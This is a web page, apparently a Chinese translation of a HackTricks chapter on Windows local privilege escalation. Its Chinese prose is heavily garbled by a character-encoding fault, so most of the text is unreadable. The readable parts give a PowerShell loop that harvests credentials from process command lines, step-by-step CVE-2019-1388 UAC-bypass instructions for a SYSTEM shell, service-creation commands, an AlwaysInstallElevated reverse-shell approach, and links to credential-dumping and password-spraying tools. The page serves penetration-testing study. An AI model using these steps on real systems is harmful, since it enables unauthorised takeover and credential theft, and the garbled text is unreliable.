<p>Windowsæä¾›äº†ä¸€ç§ç§°ä¸º<strong>å‘½åç®¡é“</strong>çš„åŠŸèƒ½ï¼Œå…è®¸ä¸ç›¸å…³çš„è¿›ç¨‹å…±äº«æ•°æ®ï¼Œç”šè‡³è·¨ä¸åŒç½‘ç»œã€‚è¿™ç±»ä¼¼äºå®¢æˆ·ç«¯/æœåŠ¡å™¨æ¶æ„ï¼Œè§’è‰²å®šä¹‰ä¸º<strong>å‘½åç®¡é“æœåŠ¡å™¨</strong>å’Œ<strong>å‘½åç®¡é“å®¢æˆ·ç«¯</strong>ã€‚</p>
<p>å½“<strong>å®¢æˆ·ç«¯</strong>é€šè¿‡ç®¡é“å‘é€æ•°æ®æ—¶ï¼Œè®¾ç½®ç®¡é“çš„<strong>æœåŠ¡å™¨</strong>æœ‰èƒ½åŠ›<strong>é‡‡ç”¨å®¢æˆ·ç«¯çš„èº«ä»½</strong>ï¼Œå‰ææ˜¯å®ƒå…·æœ‰å¿…è¦çš„<strong>SeImpersonate</strong>æƒé™ã€‚è¯†åˆ«ä¸€ä¸ª<strong>é€šè¿‡ç®¡é“è¿›è¡Œé€šä¿¡çš„ç‰¹æƒè¿›ç¨‹</strong>ï¼Œä½ å¯ä»¥æ¨¡ä»¿å®ƒï¼Œè¿™æä¾›äº†ä¸€ä¸ª<strong>è·å¾—æ›´é«˜æƒé™</strong>çš„æœºä¼šï¼Œé€šè¿‡é‡‡ç”¨è¯¥è¿›ç¨‹çš„èº«ä»½ï¼Œä¸€æ—¦å®ƒä¸æ‚¨å»ºç«‹çš„ç®¡é“è¿›è¡Œäº¤äº’ã€‚æœ‰å…³æ‰§è¡Œæ­¤ç±»æ”»å‡»çš„è¯´æ˜ï¼Œå¯ä»¥åœ¨<a href="named-pipe-client-impersonation.html"><strong>è¿™é‡Œ</strong></a>å’Œ<a href="./#from-high-integrity-to-system"><strong>è¿™é‡Œ</strong></a>æ‰¾åˆ°æœ‰ç”¨çš„æŒ‡å—ã€‚</p>
<p>æ­¤å¤–ï¼Œä»¥ä¸‹å·¥å…·å…è®¸<strong>ä½¿ç”¨åƒburpè¿™æ ·çš„å·¥å…·æ‹¦æˆªå‘½åç®¡é“é€šä¿¡ï¼š</strong> <a href="https://github.com/gabriel-sztejnworcel/pipe-intercept"><strong>https://github.com/gabriel-sztejnworcel/pipe-intercept</strong></a> <strong>è€Œè¿™ä¸ªå·¥å…·å…è®¸åˆ—å‡ºå¹¶æŸ¥çœ‹æ‰€æœ‰ç®¡é“ä»¥å¯»æ‰¾æƒé™æå‡</strong> <a href="https://github.com/cyberark/PipeViewer"><strong>https://github.com/cyberark/PipeViewer</strong></a></p>
<h2 id="æ‚é¡¹"><a class="header" href="#æ‚é¡¹">æ‚é¡¹</a></h2>
<h3 id="ç›‘æ§å‘½ä»¤è¡Œä¸­çš„å¯†ç "><a class="header" href="#ç›‘æ§å‘½ä»¤è¡Œä¸­çš„å¯†ç "><strong>ç›‘æ§å‘½ä»¤è¡Œä¸­çš„å¯†ç </strong></a></h3>
<p>å½“ä»¥ç”¨æˆ·èº«ä»½è·å–shellæ—¶ï¼Œå¯èƒ½ä¼šæœ‰è®¡åˆ’ä»»åŠ¡æˆ–å…¶ä»–è¿›ç¨‹æ­£åœ¨æ‰§è¡Œï¼Œè¿™äº›è¿›ç¨‹<strong>åœ¨å‘½ä»¤è¡Œä¸­ä¼ é€’å‡­æ®</strong>ã€‚ä¸‹é¢çš„è„šæœ¬æ¯ä¸¤ç§’æ•è·ä¸€æ¬¡è¿›ç¨‹å‘½ä»¤è¡Œï¼Œå¹¶å°†å½“å‰çŠ¶æ€ä¸å…ˆå‰çŠ¶æ€è¿›è¡Œæ¯”è¾ƒï¼Œè¾“å‡ºä»»ä½•å·®å¼‚ã€‚</p>
<pre><code class="language-powershell">while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
</code></pre>
<h2 id="ä»è¿›ç¨‹ä¸­çªƒå–å¯†ç "><a class="header" href="#ä»è¿›ç¨‹ä¸­çªƒå–å¯†ç ">ä»è¿›ç¨‹ä¸­çªƒå–å¯†ç </a></h2>
<h2 id="ä»ä½æƒé™ç”¨æˆ·åˆ°-ntauthority-system-cve-2019-1388--uac-ç»•è¿‡"><a class="header" href="#ä»ä½æƒé™ç”¨æˆ·åˆ°-ntauthority-system-cve-2019-1388--uac-ç»•è¿‡">ä»ä½æƒé™ç”¨æˆ·åˆ° NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC ç»•è¿‡</a></h2>
<p>å¦‚æœæ‚¨å¯ä»¥è®¿é—®å›¾å½¢ç•Œé¢ï¼ˆé€šè¿‡æ§åˆ¶å°æˆ– RDPï¼‰ï¼Œå¹¶ä¸” UAC å·²å¯ç”¨ï¼Œåœ¨æŸäº›ç‰ˆæœ¬çš„ Microsoft Windows ä¸­ï¼Œå¯ä»¥ä»æ— æƒé™ç”¨æˆ·è¿è¡Œç»ˆç«¯æˆ–ä»»ä½•å…¶ä»–è¿›ç¨‹ï¼Œä¾‹å¦‚ "NT\AUTHORITY SYSTEM"ã€‚</p>
<p>è¿™ä½¿å¾—å¯ä»¥åœ¨åŒä¸€æ¼æ´ä¸‹åŒæ—¶æå‡æƒé™å¹¶ç»•è¿‡ UACã€‚æ­¤å¤–ï¼Œæ— éœ€å®‰è£…ä»»ä½•ä¸œè¥¿ï¼Œè¿‡ç¨‹ä¸­ä½¿ç”¨çš„äºŒè¿›åˆ¶æ–‡ä»¶ç”± Microsoft ç­¾åå¹¶å‘å¸ƒã€‚</p>
<p>ä¸€äº›å—å½±å“çš„ç³»ç»Ÿå¦‚ä¸‹ï¼š</p>
<pre><code>SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
</code></pre>
<p>è¦åˆ©ç”¨æ­¤æ¼æ´ï¼Œå¿…é¡»æ‰§è¡Œä»¥ä¸‹æ­¥éª¤ï¼š</p>
<pre><code>1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
</code></pre>
<p>æ‚¨å¯ä»¥åœ¨ä»¥ä¸‹ GitHub å­˜å‚¨åº“ä¸­æ‰¾åˆ°æ‰€æœ‰å¿…è¦çš„æ–‡ä»¶å’Œä¿¡æ¯ï¼š</p>
<p>https://github.com/jas502n/CVE-2019-1388</p>
<h2 id="ä»ç®¡ç†å‘˜ä¸­ç­‰å®Œæ•´æ€§çº§åˆ«åˆ°é«˜å®Œæ•´æ€§çº§åˆ«--uac-ç»•è¿‡"><a class="header" href="#ä»ç®¡ç†å‘˜ä¸­ç­‰å®Œæ•´æ€§çº§åˆ«åˆ°é«˜å®Œæ•´æ€§çº§åˆ«--uac-ç»•è¿‡">ä»ç®¡ç†å‘˜ä¸­ç­‰å®Œæ•´æ€§çº§åˆ«åˆ°é«˜å®Œæ•´æ€§çº§åˆ« / UAC ç»•è¿‡</a></h2>
<p>é˜…è¯»æ­¤å†…å®¹ä»¥<strong>äº†è§£å®Œæ•´æ€§çº§åˆ«</strong>ï¼š</p>
<p>{% content-ref url="integrity-levels.md" %}
<a href="integrity-levels.html">integrity-levels.md</a>
{% endcontent-ref %}</p>
<p>ç„¶å<strong>é˜…è¯»æ­¤å†…å®¹ä»¥äº†è§£ UAC å’Œ UAC ç»•è¿‡ï¼š</strong></p>
<p>{% content-ref url="../authentication-credentials-uac-and-efs/uac-user-account-control.md" %}
<a href="../authentication-credentials-uac-and-efs/uac-user-account-control.html">uac-user-account-control.md</a>
{% endcontent-ref %}</p>
<h2 id="ä»é«˜å®Œæ•´æ€§åˆ°ç³»ç»Ÿ"><a class="header" href="#ä»é«˜å®Œæ•´æ€§åˆ°ç³»ç»Ÿ"><strong>ä»é«˜å®Œæ•´æ€§åˆ°ç³»ç»Ÿ</strong></a></h2>
<h3 id="æ–°æœåŠ¡"><a class="header" href="#æ–°æœåŠ¡"><strong>æ–°æœåŠ¡</strong></a></h3>
<p>å¦‚æœæ‚¨å·²ç»åœ¨é«˜å®Œæ•´æ€§è¿›ç¨‹ä¸­è¿è¡Œï¼Œ<strong>åˆ‡æ¢åˆ° SYSTEM</strong> å¯ä»¥é€šè¿‡<strong>åˆ›å»ºå’Œæ‰§è¡Œæ–°æœåŠ¡</strong>æ¥è½»æ¾å®ç°ï¼š</p>
<pre><code>sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
</code></pre>
<h3 id="alwaysinstallelevated-1"><a class="header" href="#alwaysinstallelevated-1">AlwaysInstallElevated</a></h3>
<p>ä»é«˜å®Œæ•´æ€§è¿›ç¨‹ä¸­ï¼Œæ‚¨å¯ä»¥å°è¯•<strong>å¯ç”¨ AlwaysInstallElevated æ³¨å†Œè¡¨é¡¹</strong>å¹¶<strong>å®‰è£…</strong>ä¸€ä¸ªä½¿ç”¨ <em><strong>.msi</strong></em> åŒ…è£…çš„åå‘ shellã€‚<br />
<a href="./#alwaysinstallelevated">æœ‰å…³ç›¸å…³æ³¨å†Œè¡¨é¡¹å’Œå¦‚ä½•å®‰è£… <em>.msi</em> åŒ…çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·ç‚¹å‡»è¿™é‡Œã€‚</a></p>
<h3 id="high--seimpersonate-privilege-to-system"><a class="header" href="#high--seimpersonate-privilege-to-system">High + SeImpersonate privilege to System</a></h3>
<p><strong>æ‚¨å¯ä»¥</strong> <a href="seimpersonate-from-high-to-system.html"><strong>åœ¨è¿™é‡Œæ‰¾åˆ°ä»£ç </strong></a><strong>ã€‚</strong></p>
<h3 id="from-sedebug--seimpersonate-to-full-token-privileges"><a class="header" href="#from-sedebug--seimpersonate-to-full-token-privileges">From SeDebug + SeImpersonate to Full Token privileges</a></h3>
<p>å¦‚æœæ‚¨æ‹¥æœ‰è¿™äº›ä»¤ç‰Œæƒé™ï¼ˆæ‚¨å¯èƒ½ä¼šåœ¨å·²ç»æ˜¯é«˜å®Œæ•´æ€§è¿›ç¨‹ä¸­æ‰¾åˆ°ï¼‰ï¼Œæ‚¨å°†èƒ½å¤Ÿ<strong>æ‰“å¼€å‡ ä¹ä»»ä½•è¿›ç¨‹</strong>ï¼ˆéå—ä¿æŠ¤è¿›ç¨‹ï¼‰ï¼Œä½¿ç”¨ SeDebug æƒé™ï¼Œ<strong>å¤åˆ¶è¯¥è¿›ç¨‹çš„ä»¤ç‰Œ</strong>ï¼Œå¹¶åˆ›å»ºä¸€ä¸ª<strong>å…·æœ‰è¯¥ä»¤ç‰Œçš„ä»»æ„è¿›ç¨‹</strong>ã€‚<br />
ä½¿ç”¨æ­¤æŠ€æœ¯é€šå¸¸<strong>é€‰æ‹©ä»»ä½•ä»¥ SYSTEM èº«ä»½è¿è¡Œçš„è¿›ç¨‹ï¼Œå…·æœ‰æ‰€æœ‰ä»¤ç‰Œæƒé™</strong>ï¼ˆ<em>æ˜¯çš„ï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°æ²¡æœ‰æ‰€æœ‰ä»¤ç‰Œæƒé™çš„ SYSTEM è¿›ç¨‹</em>ï¼‰ã€‚<br />
<strong>æ‚¨å¯ä»¥åœ¨è¿™é‡Œæ‰¾åˆ°</strong> <a href="sedebug-+-seimpersonate-copy-token.html"><strong>æ‰§è¡Œæ‰€æè®®æŠ€æœ¯çš„ä»£ç ç¤ºä¾‹</strong></a><strong>ã€‚</strong></p>
<h3 id="named-pipes"><a class="header" href="#named-pipes"><strong>Named Pipes</strong></a></h3>
<p>æ­¤æŠ€æœ¯è¢« meterpreter ç”¨äºåœ¨ <code>getsystem</code> ä¸­è¿›è¡Œå‡çº§ã€‚è¯¥æŠ€æœ¯åŒ…æ‹¬<strong>åˆ›å»ºä¸€ä¸ªç®¡é“ï¼Œç„¶ååˆ›å»º/æ»¥ç”¨ä¸€ä¸ªæœåŠ¡æ¥å†™å…¥è¯¥ç®¡é“</strong>ã€‚ç„¶åï¼Œä½¿ç”¨**<code>SeImpersonate</code>** æƒé™åˆ›å»ºç®¡é“çš„<strong>æœåŠ¡å™¨</strong>å°†èƒ½å¤Ÿ<strong>æ¨¡æ‹Ÿç®¡é“å®¢æˆ·ç«¯ï¼ˆæœåŠ¡ï¼‰çš„ä»¤ç‰Œ</strong>ï¼Œä»è€Œè·å¾— SYSTEM æƒé™ã€‚<br />
å¦‚æœæ‚¨æƒ³è¦<a href="./#named-pipe-client-impersonation"><strong>äº†è§£æ›´å¤šå…³äºå‘½åç®¡é“çš„ä¿¡æ¯ï¼Œè¯·é˜…è¯»è¿™ä¸ª</strong></a>ã€‚<br />
å¦‚æœæ‚¨æƒ³é˜…è¯»ä¸€ä¸ª<a href="from-high-integrity-to-system-with-name-pipes.html"><strong>å¦‚ä½•é€šè¿‡å‘½åç®¡é“ä»é«˜å®Œæ•´æ€§è½¬åˆ° System çš„ç¤ºä¾‹ï¼Œè¯·é˜…è¯»è¿™ä¸ª</strong></a>ã€‚</p>
<h3 id="dll-hijacking"><a class="header" href="#dll-hijacking">Dll Hijacking</a></h3>
<p>å¦‚æœæ‚¨æˆåŠŸ<strong>åŠ«æŒä¸€ä¸ªç”±ä»¥</strong>SYSTEM<strong>èº«ä»½è¿è¡Œçš„</strong>è¿›ç¨‹<strong>åŠ è½½çš„ dllï¼Œæ‚¨å°†èƒ½å¤Ÿä»¥è¿™äº›æƒé™æ‰§è¡Œä»»æ„ä»£ç ã€‚å› æ­¤ï¼ŒDll Hijacking å¯¹äºè¿™ç§ç‰¹æƒå‡çº§ä¹Ÿå¾ˆæœ‰ç”¨ï¼Œè€Œä¸”ï¼Œå¦‚æœä»é«˜å®Œæ•´æ€§è¿›ç¨‹è¿›è¡Œï¼Œ<strong>æ›´å®¹æ˜“å®ç°</strong>ï¼Œå› ä¸ºå®ƒå°†å¯¹ç”¨äºåŠ è½½ dll çš„æ–‡ä»¶å¤¹å…·æœ‰</strong>å†™æƒé™**ã€‚<br />
<strong>æ‚¨å¯ä»¥</strong> <a href="dll-hijacking/"><strong>åœ¨è¿™é‡Œäº†è§£æ›´å¤šå…³äº Dll åŠ«æŒçš„ä¿¡æ¯</strong></a><strong>ã€‚</strong></p>
<h3 id="from-administrator-or-network-service-to-system"><a class="header" href="#from-administrator-or-network-service-to-system"><strong>From Administrator or Network Service to System</strong></a></h3>
<p>{% embed url="https://github.com/sailay1996/RpcSsImpersonator" %}</p>
<h3 id="from-local-service-or-network-service-to-full-privs"><a class="header" href="#from-local-service-or-network-service-to-full-privs">From LOCAL SERVICE or NETWORK SERVICE to full privs</a></h3>
<p><strong>é˜…è¯»ï¼š</strong> <a href="https://github.com/itm4n/FullPowers"><strong>https://github.com/itm4n/FullPowers</strong></a></p>
<h2 id="more-help"><a class="header" href="#more-help">More help</a></h2>
<p><a href="https://github.com/ropnop/impacket_static_binaries">é™æ€ impacket äºŒè¿›åˆ¶æ–‡ä»¶</a></p>
<h2 id="useful-tools"><a class="header" href="#useful-tools">Useful tools</a></h2>
<p><strong>æŸ¥æ‰¾ Windows æœ¬åœ°ç‰¹æƒå‡çº§å‘é‡çš„æœ€ä½³å·¥å…·ï¼š</strong> <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS"><strong>WinPEAS</strong></a></p>
<p><strong>PS</strong></p>
<p><a href="https://github.com/itm4n/PrivescCheck"><strong>PrivescCheck</strong></a><br />
<a href="https://github.com/PowerShellMafia/PowerSploit"><strong>PowerSploit-Privesc(PowerUP)</strong></a> <strong>-- æ£€æŸ¥é”™è¯¯é…ç½®å’Œæ•æ„Ÿæ–‡ä»¶ (</strong><a href="https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md"><strong>åœ¨è¿™é‡Œæ£€æŸ¥</strong></a><strong>)ã€‚å·²æ£€æµ‹ã€‚</strong><br />
<a href="https://github.com/411Hall/JAWS"><strong>JAWS</strong></a> <strong>-- æ£€æŸ¥ä¸€äº›å¯èƒ½çš„é”™è¯¯é…ç½®å¹¶æ”¶é›†ä¿¡æ¯ (</strong><a href="https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md"><strong>åœ¨è¿™é‡Œæ£€æŸ¥</strong></a><strong>)ã€‚</strong><br />
<a href="https://github.com/enjoiz/Privesc"><strong>privesc</strong> </a><strong>-- æ£€æŸ¥é”™è¯¯é…ç½®</strong><br />
<a href="https://github.com/Arvanaghi/SessionGopher"><strong>SessionGopher</strong></a> <strong>-- æå– PuTTYã€WinSCPã€SuperPuTTYã€FileZilla å’Œ RDP ä¿å­˜çš„ä¼šè¯ä¿¡æ¯ã€‚ä½¿ç”¨ -Thorough åœ¨æœ¬åœ°ã€‚</strong><br />
<a href="https://github.com/peewpw/Invoke-WCMDump"><strong>Invoke-WCMDump</strong></a> <strong>-- ä»å‡­æ®ç®¡ç†å™¨æå–å‡­æ®ã€‚å·²æ£€æµ‹ã€‚</strong><br />
<a href="https://github.com/dafthack/DomainPasswordSpray"><strong>DomainPasswordSpray</strong></a> <strong>-- åœ¨åŸŸä¸­å–·æ´’æ”¶é›†åˆ°çš„å¯†ç </strong><br />
<a href="https://github.com/Kevin-Robertson/Inveigh"><strong>Inveigh</strong></a> <strong>-- Inveigh æ˜¯ä¸€ä¸ª PowerShell ADIDNS/LLMNR/mDNS/NBNS æ¬ºéª—å’Œä¸­é—´äººå·¥å…·ã€‚</strong><br />
<a href="https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1"><strong>WindowsEnum</strong></a> <strong>-- åŸºæœ¬çš„ privesc Windows æšä¸¾</strong><br />
<a href="https://github.com/rasta-mouse/Sherlock"><del><strong>Sherlock</strong></del></a> <strong>~~</strong>~~ -- æœç´¢å·²çŸ¥çš„ privesc æ¼æ´ï¼ˆå·²å¼ƒç”¨ï¼Œæ”¹ä¸º Watsonï¼‰<br />
<a href="https://github.com/A-mIn3/WINspect"><del><strong>WINspect</strong></del></a> -- æœ¬åœ°æ£€æŸ¥ <strong>ï¼ˆéœ€è¦ç®¡ç†å‘˜æƒé™ï¼‰</strong></p>
<p><strong>Exe</strong></p>
<p><a href="https://github.com/rasta-mouse/Watson"><strong>Watson</strong></a> -- æœç´¢å·²çŸ¥çš„ privesc æ¼æ´ï¼ˆéœ€è¦ä½¿ç”¨ VisualStudio ç¼–è¯‘ï¼‰ (<a href="https://github.com/carlospolop/winPE/tree/master/binaries/watson"><strong>é¢„ç¼–è¯‘</strong></a>)<br />
<a href="https://github.com/GhostPack/Seatbelt"><strong>SeatBelt</strong></a> -- æšä¸¾ä¸»æœºä»¥æœç´¢é”™è¯¯é…ç½®ï¼ˆæ›´å¤šæ˜¯æ”¶é›†ä¿¡æ¯å·¥å…·è€Œé privescï¼‰ï¼ˆéœ€è¦ç¼–è¯‘ï¼‰ <strong>ï¼ˆ<a href="https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt"><strong>é¢„ç¼–è¯‘</strong></a></strong>ï¼‰**<br />
<a href="https://github.com/AlessandroZ/LaZagne"><strong>LaZagne</strong></a> <strong>-- ä»è®¸å¤šè½¯ä»¶ä¸­æå–å‡­æ®ï¼ˆåœ¨ github ä¸Šæœ‰é¢„ç¼–è¯‘ exeï¼‰</strong><br />
<a href="https://github.com/GhostPack/SharpUp"><strong>SharpUP</strong></a> <strong>-- PowerUp çš„ C# ç§»æ¤ç‰ˆ</strong><br />
<a href="https://github.com/AlessandroZ/BeRoot"><del><strong>Beroot</strong></del></a> <strong>~~</strong>~~ -- æ£€æŸ¥é”™è¯¯é…ç½®ï¼ˆåœ¨ github ä¸Šæœ‰å¯æ‰§è¡Œçš„é¢„ç¼–è¯‘ç‰ˆæœ¬ï¼‰ã€‚ä¸æ¨èã€‚å®ƒåœ¨ Win10 ä¸Šæ•ˆæœä¸å¥½ã€‚<br />
<a href="https://github.com/pentestmonkey/windows-privesc-check"><del><strong>Windows-Privesc-Check</strong></del></a> -- æ£€æŸ¥å¯èƒ½çš„é”™è¯¯é…ç½®ï¼ˆæ¥è‡ª python çš„ exeï¼‰ã€‚ä¸æ¨èã€‚å®ƒåœ¨ Win10 ä¸Šæ•ˆæœä¸å¥½ã€‚</p>
<p><strong>Bat</strong></p>
<p><a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS"><strong>winPEASbat</strong> </a>-- åŸºäºæ­¤å¸–åˆ›å»ºçš„å·¥å…·ï¼ˆå®ƒä¸éœ€è¦ accesschk æ­£å¸¸å·¥ä½œï¼Œä½†å¯ä»¥ä½¿ç”¨å®ƒï¼‰ã€‚</p>
<p><strong>Local</strong></p>
<p><a href="https://github.com/GDSSecurity/Windows-Exploit-Suggester"><strong>Windows-Exploit-Suggester</strong></a> -- è¯»å– <strong>systeminfo</strong> çš„è¾“å‡ºå¹¶æ¨èæœ‰æ•ˆçš„æ¼æ´ï¼ˆæœ¬åœ° pythonï¼‰<br />
<a href="https://github.com/bitsadmin/wesng"><strong>Windows Exploit Suggester Next Generation</strong></a> -- è¯»å– <strong>systeminfo</strong> çš„è¾“å‡ºå¹¶æ¨èæœ‰æ•ˆçš„æ¼æ´ï¼ˆæœ¬åœ° pythonï¼‰</p>
<p><strong>Meterpreter</strong></p>
<p><em>multi/recon/local_exploit_suggestor</em></p>
<p>æ‚¨å¿…é¡»ä½¿ç”¨æ­£ç¡®ç‰ˆæœ¬çš„ .NET ç¼–è¯‘è¯¥é¡¹ç›®ï¼ˆ<a href="https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/">æŸ¥çœ‹æ­¤å¤„</a>ï¼‰ã€‚è¦æŸ¥çœ‹å—å®³ä¸»æœºä¸Šå®‰è£…çš„ .NET ç‰ˆæœ¬ï¼Œæ‚¨å¯ä»¥æ‰§è¡Œï¼š</p>
<pre><code>C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
</code></pre>
<h2 id="å‚è€ƒä¹¦ç›®"><a class="header" href="#å‚è€ƒä¹¦ç›®">å‚è€ƒä¹¦ç›®</a></h2>
<ul>
<li><a href="http://www.fuzzysecurity.com/tutorials/16.html">http://www.fuzzysecurity.com/tutorials/16.html</a>\</li>
<li><a href="http://www.greyhathacker.net/?p=738">http://www.greyhathacker.net/?p=738</a>\</li>
<li><a href="http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html">http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html</a>\</li>
<li><a href="https://github.com/sagishahar/lpeworkshop">https://github.com/sagishahar/lpeworkshop</a>\</li>
<li><a href="https://www.youtube.com/watch?v=_8xJaaQlpBo">https://www.youtube.com/watch?v=_8xJaaQlpBo</a>\</li>
<li><a href="https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html">https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html</a>\</li>
<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md</a>\</li>
<li><a href="https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/">https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/</a>\</li>
<li><a href="https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md">https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md</a>\</li>
<li><a href="https://github.com/frizb/Windows-Privilege-Escalation">https://github.com/frizb/Windows-Privilege-Escalation</a>\</li>
<li><a href="https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/">https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/</a>\</li>
<li><a href="https://github.com/frizb/Windows-Privilege-Escalation">https://github.com/frizb/Windows-Privilege-Escalation</a>\</li>
<li><a href="http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html">http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html</a>\</li>
<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections</a></li>
</ul>
<p>{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)</strong></a><img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ å’Œå®è·µ GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)</strong><img src="../../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒ HackTricks</summary>
<ul>
<li>æŸ¥çœ‹ <a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord ç¾¤ç»„</strong></a> æˆ– <a href="https://t.me/peass"><strong>telegram ç¾¤ç»„</strong></a> æˆ– <strong>å…³æ³¨</strong> æˆ‘ä»¬çš„ <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> å’Œ <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../windows-hardening/checklist-windows-privilege-escalation.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../../windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../windows-hardening/checklist-windows-privilege-escalation.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../../windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../../elasticlunr.min.js"></script>
        <script src="../../mark.min.js"></script>
        <script src="../../searcher.js"></script>

        <script src="../../clipboard.min.js"></script>
        <script src="../../highlight.js"></script>
        <script src="../../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
